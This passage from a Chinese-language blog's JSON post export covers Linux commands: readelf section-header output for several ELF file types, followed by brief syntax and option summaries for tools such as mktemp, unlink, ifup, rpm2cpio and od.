[ 6] .gnu.version VERSYM 080483ec 0003ec 00001a 02 A 4 0 2 [ 7] .gnu.version_r VERNEED 08048408 000408 000060 00 A 5 2 4 [ 8] .rel.dyn REL 08048468 000468 000010 08 A 4 0 4 [ 9] .rel.plt REL 08048478 000478 000048 08 A 4 11 4 [10] .init PROGBITS 080484c0 0004c0 000017 00 AX 0 0 4 [11] .plt PROGBITS 080484d8 0004d8 0000a0 04 AX 0 0 4 [12] .text PROGBITS 08048580 000580 000268 00 AX 0 0 16 [13] .fini PROGBITS 080487e8 0007e8 00001c 00 AX 0 0 4 [14] .rodata PROGBITS 08048804 000804 00001a 00 A 0 0 4 [15] .eh_frame_hdr PROGBITS 08048820 000820 000044 00 A 0 0 4 [16] .eh_frame PROGBITS 08048864 000864 00010c 00 A 0 0 4 [17] .ctors PROGBITS 08049970 000970 00000c 00 WA 0 0 4 [18] .dtors PROGBITS 0804997c 00097c 000008 00 WA 0 0 4 [19] .jcr PROGBITS 08049984 000984 000004 00 WA 0 0 4 [20] .dynamic DYNAMIC 08049988 000988 0000e0 08 WA 5 0 4 [21] .got PROGBITS 08049a68 000a68 000004 04 WA 0 0 4 [22] .got.plt PROGBITS 08049a6c 000a6c 000030 04 WA 0 0 4 [23] .data PROGBITS 08049a9c 000a9c 000004 00 WA 0 0 4 [24] .bss NOBITS 08049aa0 000aa0 000098 00 WA 0 0 8 [25] .comment PROGBITS 00000000 000aa0 000114 00 0 0 1 [26] .debug_aranges PROGBITS 00000000 000bb4 000020 00 0 0 1 [27] .debug_pubnames PROGBITS 00000000 000bd4 000028 00 0 0 1 [28] .debug_info PROGBITS 00000000 000bfc 0067aa 00 0 0 1 [29] .debug_abbrev PROGBITS 00000000 0073a6 000726 00 0 0 1 [30] .debug_line PROGBITS 00000000 007acc 0003e1 00 0 0 1 [31] .debug_frame PROGBITS 00000000 007eb0 00009c 00 0 0 4 [32] .debug_str PROGBITS 00000000 007f4c 000735 00 0 0 1 [33] .debug_loc PROGBITS 00000000 008681 0000f3 00 0 0 1 [34] .shstrtab STRTAB 00000000 008774 000151 00 0 0 1 [35] .symtab SYMTAB 00000000 008e90 000590 10 36 61 4 [36] .strtab STRTAB 00000000 009420 0003f4 00 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 可见，相对非调试版本的可执行文件，多了&quot;.debug*&quot;段的信息。 查看一个目标文件的 elf 文件的节信息： [root@localhost test]$ readelf -S myfile.o There are 15 section headers, starting at offset 0x204: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .text PROGBITS 00000000 000034 00009e 00 AX 0 0 4 [ 2] .rel.text REL 00000000 000744 000060 08 13 1 4 [ 3] .data PROGBITS 00000000 0000d4 000000 00 WA 0 0 4 [ 4] .bss NOBITS 00000000 0000d4 000001 00 WA 0 0 4 [ 5] .ctors PROGBITS 00000000 0000d4 000004 00 WA 0 0 4 [ 6] .rel.ctors REL 00000000 0007a4 000008 08 13 5 4 [ 7] .rodata PROGBITS 00000000 0000d8 000006 00 A 0 0 1 [ 8] .eh_frame PROGBITS 00000000 0000e0 00008c 00 A 0 0 4 [ 9] .rel.eh_frame REL 00000000 0007ac 000028 08 13 8 4 [10] .comment PROGBITS 00000000 00016c 00002e 00 0 0 1 [11] .note.GNU-stack PROGBITS 00000000 00019a 000000 00 0 0 1 [12] .shstrtab STRTAB 00000000 00019a 00006a 00 0 0 1 [13] .symtab SYMTAB 00000000 00045c 000180 10 14 14 4 [14] .strtab STRTAB 00000000 0005dc 000166 00 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) ```shell **查看一个静态库文件的elf文件的节信息：** ```shell [root@localhost test]$ readelf -S libmy.a File: libmy.a(myfile.o) There are 15 section headers, starting at offset 0x204: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .text PROGBITS 00000000 000034 00009e 00 AX 0 0 4 [ 2] .rel.text REL 00000000 000744 000060 08 13 1 4 [ 3] .data PROGBITS 00000000 0000d4 000000 00 WA 0 0 4 [ 4] .bss NOBITS 00000000 0000d4 000001 00 WA 0 0 4 [ 5] .ctors PROGBITS 00000000 0000d4 000004 00 WA 0 0 4 [ 6] .rel.ctors REL 00000000 0007a4 000008 08 13 5 4 [ 7] .rodata PROGBITS 00000000 0000d8 000006 00 A 0 0 1 [ 8] .eh_frame PROGBITS 00000000 0000e0 00008c 00 A 0 0 4 [ 9] .rel.eh_frame REL 00000000 0007ac 000028 08 13 8 4 [10] .comment PROGBITS 00000000 00016c 00002e 00 0 0 1 [11] .note.GNU-stack PROGBITS 00000000 00019a 000000 00 0 0 1 [12] .shstrtab STRTAB 00000000 00019a 00006a 00 0 0 1 [13] .symtab SYMTAB 00000000 00045c 000180 10 14 14 4 [14] .strtab STRTAB 00000000 0005dc 000166 00 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 查看一个动态库文件的 elf 文件的节信息： [root@localhost test]$ readelf -S libmy.so There are 27 section headers, starting at offset 0xad0: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .gnu.hash GNU_HASH 000000d4 0000d4 00003c 04 A 2 0 4 [ 2] .dynsym DYNSYM 00000110 000110 000120 10 A 3 1 4 [ 3] .dynstr STRTAB 00000230 000230 000199 00 A 0 0 1 [ 4] .gnu.version VERSYM 000003ca 0003ca 000024 02 A 2 0 2 [ 5] .gnu.version_r VERNEED 000003f0 0003f0 000050 00 A 3 2 4 [ 6] .rel.dyn REL 00000440 000440 0000b0 08 A 2 0 4 [ 7] .rel.plt REL 000004f0 0004f0 000010 08 A 2 9 4 [ 8] .init PROGBITS 00000500 000500 000017 00 AX 0 0 4 [ 9] .plt PROGBITS 00000518 000518 000030 04 AX 0 0 4 [10] .text PROGBITS 00000550 000550 0001c4 00 AX 0 0 16 [11] .fini PROGBITS 00000714 000714 00001c 00 AX 0 0 4 [12] .rodata PROGBITS 00000730 000730 000006 00 A 0 0 1 [13] .eh_frame_hdr PROGBITS 00000738 000738 00002c 00 A 0 0 4 [14] .eh_frame PROGBITS 00000764 000764 000090 00 A 0 0 4 [15] .ctors PROGBITS 000017f4 0007f4 00000c 00 WA 0 0 4 [16] .dtors PROGBITS 00001800 000800 000008 00 WA 0 0 4 [17] .jcr PROGBITS 00001808 000808 000004 00 WA 0 0 4 [18] .data.rel.ro PROGBITS 0000180c 00080c 000004 00 WA 0 0 4 [19] .dynamic DYNAMIC 00001810 000810 0000e0 08 WA 3 0 4 [20] .got PROGBITS 000018f0 0008f0 00000c 04 WA 0 0 4 [21] .got.plt PROGBITS 000018fc 0008fc 000014 04 WA 0 0 4 [22] .bss NOBITS 00001910 000910 00000c 00 WA 0 0 4 [23] .comment PROGBITS 00000000 000910 0000e6 00 0 0 1 [24] .shstrtab STRTAB 00000000 0009f6 0000da 00 0 0 1 [25] .symtab SYMTAB 00000000 000f08 000410 10 26 48 4 [26] .strtab STRTAB 00000000 001318 000333 00 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"readelf","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/readelf/","stats":{"text":"24 min read","time":1387000,"words":4411,"minutes":24},"date":"2022-02-01 15:27:51","dateFormat":"2022-02-01"},{"content":"删除 C 语言源代码文件中的函数原型。 补充说明 unprotoize 命令属于 gcc 套件，用于删除 C 语言源代码文件中的函数原型。 语法 unprotoize (选项) (参数) 选项 -d：设置需要转换代码的目录； -x：转换代码时排除的文件。 参数 文件：需要转换代码的 C 语言源文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"unprotoize","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/unprotoize/","stats":{"text":"1 min read","time":20000,"words":95,"minutes":1},"date":"2022-02-01 15:27:13","dateFormat":"2022-02-01"},{"content":"设置 X-Window 系统中的用户爱好的实用工具。 补充说明 xset 命令是设置 X-Window 系统中的用户爱好的实用工具。 语法 xset (选项) (参数) 选项 -b：蜂鸣器开关设置； -c：键盘按键声响设置。 参数 c：键盘按键声响设置； s：屏幕保护程序设置。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xset","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xset/","stats":{"text":"1 min read","time":19000,"words":88,"minutes":1},"date":"2022-02-01 15:26:43","dateFormat":"2022-02-01"},{"content":"创建临时文件供 shell 脚本使用。 补充说明 mktemp 命令被用来创建临时文件供 shell 脚本使用。 语法 mktemp (选项) (参数) 选项 -q：执行时若发生错误，不会显示任何信息； -u：暂存文件会在 mktemp 结束前先行删除； -d：创建一个目录而非文件。 参数 文件：指定创建的临时文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mktemp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mktemp/","stats":{"text":"1 min read","time":21000,"words":99,"minutes":1},"date":"2022-02-01 15:26:28","dateFormat":"2022-02-01"},{"content":"Debian Linux 下的运行等级服务配置工具。 补充说明 rcconf 命令是 Debian Linux 下的运行等级服务配置工具，用以设置在特定的运行等级下系统服务的启动配置。 语法 rcconf (选项) 选项 --help：打印帮助信息； --dialog：使用对话命令显示菜单； --notermcheck：不按照终端属性来设置窗口尺寸。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rcconf","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rcconf/","stats":{"text":"1 min read","time":21000,"words":98,"minutes":1},"date":"2022-02-01 15:24:32","dateFormat":"2022-02-01"},{"content":"GNU-C 代码转换为 ANSI-C 代码。 补充说明 protoize 命令属于 gcc 套件，用于为 C 语言源代码文件添加函数原型，将 GNU-C 代码转换为 ANSI-C 代码。 语法 protoize (选项) (参数) 选项 -d：设置需要转换代码的目录； -x：转换代码时排除的文件。 参数 文件：需要转换代码的 C 语言源文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"protoize","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/protoize/","stats":{"text":"1 min read","time":22000,"words":101,"minutes":1},"date":"2022-02-01 15:20:31","dateFormat":"2022-02-01"},{"content":"系统调用函数 unlink 去删除指定的文件。 补充说明 unlink 命令用于系统调用函数 unlink 去删除指定的文件。和 rm 命令作用一样，都是删除文件。 语法 unlink (选项) (参数) 选项 --help：显示帮助； --version：显示版本号。 参数 文件：指定要删除的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"unlink","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/unlink/","stats":{"text":"1 min read","time":18000,"words":85,"minutes":1},"date":"2022-02-01 15:20:07","dateFormat":"2022-02-01"},{"content":"是 Linux 下 X-Window 系统的初始化程序。 补充说明 xinit 命令是 Linux 下 X-Window 系统的初始化程序，主要完成 X 服务器的初始化设置。 语法 xinit (参数) 参数 客户端选项：客户端指令及选项； --：用于区分客户端选项和服务器端选项； 服务器端选项：服务器端选项指令及选项。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xinit","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xinit/","stats":{"text":"1 min read","time":21000,"words":100,"minutes":1},"date":"2022-02-01 15:19:37","dateFormat":"2022-02-01"},{"content":"调用 lftp 指令下载指定的文件。 补充说明 lftpget 命令通过调用 lftp 指令下载指定的文件。 语法 lftpget (选项) (参数) 选项 -c：继续先前的下载； -d：输出调试信息； -v：输出详细信息。 参数 文件：指定要下载的文件，文件必须是合法的 URL 路径。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lftpget","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lftpget/","stats":{"text":"1 min read","time":18000,"words":87,"minutes":1},"date":"2022-02-01 15:17:31","dateFormat":"2022-02-01"},{"content":"提供文字模式下的滑鼠事件处理。 补充说明 gpm 命令是 Linux 的虚拟控制台下的鼠标服务器，用于在虚拟控制台下实现鼠标复制和粘贴文本的功能。 语法 gpm (选项) 选项 -a：设置加速值； -b：设置波特率； -B：设置鼠标按键次序； -m：指定鼠标设备文件； -t：设置鼠标类型。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"gpm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/gpm/","stats":{"text":"1 min read","time":22000,"words":103,"minutes":1},"date":"2022-02-01 15:16:45","dateFormat":"2022-02-01"},{"content":"使用 RPM 软件包的签名管理工具。 补充说明 rpmsign 命令使用 rpm 软件包的签名管理工具。 语法 rpmsign (选项) 选项 --addsign：为自动软件包添加签名； --checksig：验证软件包签名； --delsign：删除软件包签名； --import：导入公钥； --resign：重新签名软件包； --nodigest：不验证软件包摘要； --nosignature：不验证软件包签名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rpmsign","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rpmsign/","stats":{"text":"1 min read","time":21000,"words":98,"minutes":1},"date":"2022-02-01 15:16:29","dateFormat":"2022-02-01"},{"content":"置 Linux 中的网络接口参数。 补充说明 ifcfg 命令是一个 Bash 脚本程序，用来设置 Linux 中的网络接口参数。 语法 ifcfg (参数) 参数 网络接口：指定要操作的网络接口； add/del：添加或删除网络接口上的地址； ip 地址：指定 IP 地址和子网掩码； Stop：停用指定的网络接口的 IP 地址。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ifcfg","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ifcfg/","stats":{"text":"1 min read","time":22000,"words":101,"minutes":1},"date":"2022-02-01 15:16:05","dateFormat":"2022-02-01"},{"content":"命令行方式打印机控制程序。 补充说明 lpc 命令式命令行方式打印机控制程序，有 5 个内置命令。 语法 lpc 实例 [root@localhost ~]# lpc lpc&gt; ? 命令可能是缩写。命令是： exit help quit status ? lpc&gt; exit ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lpc","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lpc/","stats":{"text":"1 min read","time":15000,"words":66,"minutes":1},"date":"2022-02-01 15:14:51","dateFormat":"2022-02-01"},{"content":"被允许时操作指定的网络接口。 补充说明 usernetctl 命令在用于被允许时操作指定的网络接口。 语法 usernetctl (参数) 参数 网络接口：被操纵的网络接口； up：激活网络接口； down：禁用网络接口； report：报告网络接口状态。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"usernetctl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/usernetctl/","stats":{"text":"1 min read","time":16000,"words":78,"minutes":1},"date":"2022-02-01 15:14:03","dateFormat":"2022-02-01"},{"content":"perl 语言解释器。 补充说明 perl 命令是 perl 语言解释器，负责解释执行 perl 语言程序。 语法 perl (选项) (参数) 选项 -w：输出有用的警告信息； -U：允许不安全的操作； -c：仅检查文件的语法； -d：在调试下运行脚本程序。 参数 文件：要运行的 perl 脚本程序。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"perl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/perl/","stats":{"text":"1 min read","time":20000,"words":92,"minutes":1},"date":"2022-02-01 15:13:50","dateFormat":"2022-02-01"},{"content":"显示当前 SELinux 的应用模式，是强制、执行还是停用。 补充说明 grename 命令可以重命名卷组的名称。 语法 getenforce 例子 查看当前 SELinux 的应用模式。 [root@localhost ~]# getenforceEnforcing ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"getenforce","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/getenforce/","stats":{"text":"1 min read","time":12000,"words":54,"minutes":1},"date":"2022-02-01 15:13:25","dateFormat":"2022-02-01"},{"content":"显示 NFS 服务器加载的信息。 补充说明 showmount 命令查询“mountd”守护进程，以显示 NFS 服务器加载的信息。 语法 showmount (选项) (参数) 选项 -d：仅显示已被 NFS 客户端加载的目录； -e：显示 NFS 服务器上所有的共享目录。 参数 NFS 服务器：指定 NFS 服务器的 ip 地址或者主机名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"showmount","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/showmount/","stats":{"text":"1 min read","time":21000,"words":97,"minutes":1},"date":"2022-02-01 15:09:18","dateFormat":"2022-02-01"},{"content":"测试程序的代码覆盖率的工具。 补充说明 gcov 命令是一款测试程序的代码覆盖率的工具。 语法 gcov (选项) (参数) 选项 -h：显示帮助信息； -v：显示版本信息； -a：输出所有的基本块的执行计数； -n：并创建输出文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"gcov","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/gcov/","stats":{"text":"1 min read","time":17000,"words":81,"minutes":1},"date":"2022-02-01 15:06:06","dateFormat":"2022-02-01"},{"content":"保存 ip6tables 表配置。 补充说明 ip6tables-save 命令将 Linux 内核中 ip6tables 表导出到标准输出设备上。 语法 ip6tables-save (选项) 选项 -c：指定在保存iptables表时，保存当前的数据包计数器和字节计数器值； -t：指定要保存的表的名称。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ip6tables-save","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ip6tables-save/","stats":{"text":"1 min read","time":17000,"words":77,"minutes":1},"date":"2022-02-01 15:05:43","dateFormat":"2022-02-01"},{"content":"启动 vim 编辑器的 ex 编辑模式。 补充说明 在 ex 模式下启动 vim 文本编辑器。ex 执行效果如同vi -E，适用于法及参数可参照 vi 指令，如要从 Ex 模式回到普通模式，则在 vim 中输入:vi或:visual即可。 语法 ex（参数） 参数 文件：指定待编辑的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ex","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ex/","stats":{"text":"1 min read","time":20000,"words":91,"minutes":1},"date":"2022-02-01 15:04:16","dateFormat":"2022-02-01"},{"content":"显示指定的 ISO-9660 格式的设备的卷名称。 补充说明 volname 命令用于显示指定的“ISO-9660”格式的设备的卷名称，通常这种格式的设备为光驱。 语法 volname (参数) 参数 设备文件名：指定要显示卷名称的设备。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"volname","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/volname/","stats":{"text":"1 min read","time":16000,"words":76,"minutes":1},"date":"2022-02-01 15:03:59","dateFormat":"2022-02-01"},{"content":"proftpd 服务器的连接状态。 补充说明 ftptop 命令类似于 top 命令的显示风格显示 proftpd 服务器的连接状态。 语法 ftptop (选项) 选项 -D：过滤正在下载的会话； -S：仅显示指定虚拟主机的连接状态； -d：指定屏幕刷新时间，默认 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ftptop","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ftptop/","stats":{"text":"1 min read","time":17000,"words":81,"minutes":1},"date":"2022-02-01 15:03:35","dateFormat":"2022-02-01"},{"content":"显示和清空目录堆栈中的内容。 补充说明 dris 命令用于显示和清空目录堆栈中的内容。 语法 dris (选项) 选项 +n：显示从左边算起第n笔的目录； -n：显示从右边算起第n笔的目录； -l：显示目录完整的记录。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dris","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dris/","stats":{"text":"1 min read","time":17000,"words":80,"minutes":1},"date":"2022-02-01 15:03:07","dateFormat":"2022-02-01"},{"content":"还原 ip6tables 表。 补充说明 ip6tables-restore 命令用来还原 ip6tables 表。 语法 ip6tables-restore (选项) 选项 -c：指定在还原 iptables 表时，还原当前的数据包计数器和字节计数器值； -t：指定要还原的表的名称。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ip6tables-restore","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ip6tables-restore/","stats":{"text":"1 min read","time":14000,"words":64,"minutes":1},"date":"2022-02-01 15:02:21","dateFormat":"2022-02-01"},{"content":"将 RPM 软件包转换为 cpio 格式的文件。 补充说明 rpm2cpio 命令用于将 rpm 软件包转换为 cpio 格式的文件。 语法 rpm2cpio (参数) 参数 文件：指定要转换的 rpm 包的文件名。 实例 rpm2cpio ../libstdc++-4.3.0-8.i386.rpm | cpio -idv ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rpm2cpio","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rpm2cpio/","stats":{"text":"1 min read","time":16000,"words":70,"minutes":1},"date":"2022-02-01 15:02:00","dateFormat":"2022-02-01"},{"content":"验证已安装的 RPM 软件包的正确性。 补充说明 rpmverify 命令用来验证已安装的 rpm 软件包的正确性。 语法 rpmverify (选项) 选项 -Va：验证所有软件包； -V&lt;软件包&gt;f：验证指定软件包； --nomd5：不验证软件包的 md5 摘要。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rpmverify","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rpmverify/","stats":{"text":"1 min read","time":17000,"words":77,"minutes":1},"date":"2022-02-01 14:59:44","dateFormat":"2022-02-01"},{"content":"切换当前正在运行系统的运行等级。 补充说明 telint 命令用于切换当前正在运行的 Linux 系统的运行等级。 语法 telint (选项) (参数) 选项 -t：指定等待的秒数。 参数 运行等级：指定要切换的运行等级。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"telint","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/telint/","stats":{"text":"1 min read","time":15000,"words":74,"minutes":1},"date":"2022-02-01 14:59:22","dateFormat":"2022-02-01"},{"content":"显示当前每个 ftp 会话信息。 补充说明 ftpwho 命令 ftp 服务器套件 proftpd 的工作指令，用于显示当前每个 ftp 会话信息。 语法 ftpwho (选项) 选项 -h：显示帮助信息； -v：详细模式，输出更多信息。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ftpwho","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ftpwho/","stats":{"text":"1 min read","time":15000,"words":68,"minutes":1},"date":"2022-02-01 14:58:56","dateFormat":"2022-02-01"},{"content":"返回状态为失败。。 概要 false 主要用途 用于和其他命令进行逻辑运算。 返回值 返回状态总是失败；返回值为 1。 注意 该命令是 bash 内建命令，相关的帮助信息请查看 help 命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"false","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/false/","stats":{"text":"1 min read","time":14000,"words":67,"minutes":1},"date":"2022-02-01 14:55:15","dateFormat":"2022-02-01"},{"content":"追踪目的主机经过的路由信息。 补充说明 tracepath 命令用来追踪并显示报文到达目的主机所经过的路由信息。 语法 tracepath (参数) 参数 目的主机：指定追踪路由信息的目的主机； 端口：指定使用的 UDP 端口号。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tracepath","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tracepath/","stats":{"text":"1 min read","time":16000,"words":78,"minutes":1},"date":"2022-02-01 14:52:06","dateFormat":"2022-02-01"},{"content":"禁用指定的网络接口。 补充说明 ifdown 命令用于禁用指定的网络接口。 语法 ifdown (参数) 参数 网络接口：要禁用的网络接口。 实例 ifdown eth0 #禁用 eth0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ifdown","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ifdown/","stats":{"text":"1 min read","time":11000,"words":53,"minutes":1},"date":"2022-02-01 14:51:46","dateFormat":"2022-02-01"},{"content":"激活指定的网络接口。 补充说明 ifup 命令用于激活指定的网络接口。 语法 ifup (参数) 参数 网络接口：要激活的网络接口。 实例 ifup eth0 #激活 eth0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ifup","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ifup/","stats":{"text":"1 min read","time":11000,"words":53,"minutes":1},"date":"2022-02-01 14:50:02","dateFormat":"2022-02-01"},{"content":"检查文件中出现的拼写错误。 补充说明 ispell 命令用于检查文件中出现的拼写错误。 语法 ispell (参数) 参数 文件：指定要进行拼写检查的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ispell","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ispell/","stats":{"text":"1 min read","time":11000,"words":54,"minutes":1},"date":"2022-02-01 14:49:20","dateFormat":"2022-02-01"},{"content":"显示主机的 NIS 的域名。 补充说明 ypdomainname 命令显示主机的 NIS 的域名。 语法 ypdomainname (选项) 选项 -v：详细信息模式。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ypdomainname","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ypdomainname/","stats":{"text":"1 min read","time":8000,"words":39,"minutes":1},"date":"2022-02-01 14:48:30","dateFormat":"2022-02-01"},{"content":"显示主机 NIS 的域名。 补充说明 nisdomainname 命令用于显示主机 NIS 的域名。 语法 nisdomainname (选项) 选项 -v：详细信息模式。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nisdomainname","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nisdomainname/","stats":{"text":"1 min read","time":8000,"words":39,"minutes":1},"date":"2022-02-01 14:44:27","dateFormat":"2022-02-01"},{"content":"输出文件的八进制、十六进制等格式编码的字节。 补充说明 od 命令用于输出文件的八进制、十六进制或其它格式编码的字节，通常用于显示或查看文件中不能直接显示在终端的字符。 常见的文件为文本文件和二进制文件。此命令主要用来查看保存在二进制文件中的值。比如，程序可能输出大量的数据记录，每个数据是一个单精度浮点数。这些数据记录存放在一个文件中，如果想查看下这个数据，这时候 od 命令就派上用场了。在我看来，od 命令主要用来格式化输出文件数据，即对文件中的数据进行无二义性的解释。不管是 IEEE754 格式的浮点数还是 ASCII 码，od 命令都能按照需求输出它们的值。 语法 od (选项) (参数) 选项 -a：此参数的效果和同时指定“-ta”参数相同； -A：&lt;字码基数&gt;：选择以何种基数计算字码； -b：此参数的效果和同时指定“-toC”参数相同； -c：此参数的效果和同时指定“-tC”参数相同； -d：此参数的效果和同时指定“-tu2”参数相同； -f：此参数的效果和同时指定“-tfF”参数相同； -h：此参数的效果和同时指定“-tx2”参数相同； -i：此参数的效果和同时指定“-td2”参数相同； -j&lt;字符数目&gt;或--skip-bytes=&lt;字符数目&gt;：略过设置的字符数目； -l：此参数的效果和同时指定“-td4”参数相同； 